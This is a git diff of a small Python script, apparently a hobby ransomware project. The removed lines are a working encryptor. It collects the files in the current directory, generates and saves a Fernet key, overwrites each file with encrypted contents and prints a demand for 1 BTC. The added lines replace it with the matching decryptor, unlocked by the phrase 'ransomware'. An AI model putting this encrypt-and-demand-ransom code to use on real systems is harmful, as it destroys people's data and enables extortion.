@@ -6,26 +6,30 @@ from cryptography.fernet import Fernet
 files = []
 
 for file in os.listdir():
-    if file == "Encrypt.py" or file == "thekey.key" or file == "Decrypt.py":
+    if file == "main.py" or file == "thekey.key" or file == "Decrypt.py":
         continue
     if os.path.isfile(file):
-        files.append(file)    
+        files.append(file)
+
 
 print(files)
 
-# Generating Encryption key
-key = Fernet.generate_key()
+# Assigning decryption key to a variable
+with open("thekey.key", "rb") as key:
+    secretkey = key.read()
 
-# Writing the key to a file
-with open("thekey.key", "wb") as thekey:
-    thekey.write(key)
+# Secret phrase to activate decryption script (optional)
+secret_phrase = "ransomware"
+user_phrase = input("Enter the secret phrase")
 
-# Encrypting the files
-for file in files:
-    with open(file, "rb") as thefile:
-        contents = thefile.read()
-    contents_encrypted = Fernet(key).encrypt(contents)
-    with open(file, "wb") as thefile:
-        thefile.write(contents_encrypted)
+if user_phrase == secret_phrase:
 
-print("Your files are encrypted send 1 BTC to unlock your files")
+# decrypting the files (Decryption script)
+    for file in files:
+        with open(file, "rb") as thefile:
+            contents = thefile.read()
+        contents_decrypted = Fernet(secretkey).decrypt(contents)
+        with open(file, "wb") as thefile:
+            thefile.write(contents_decrypted)
+else:
+    print("oops wrong one, TRY AGAIN")
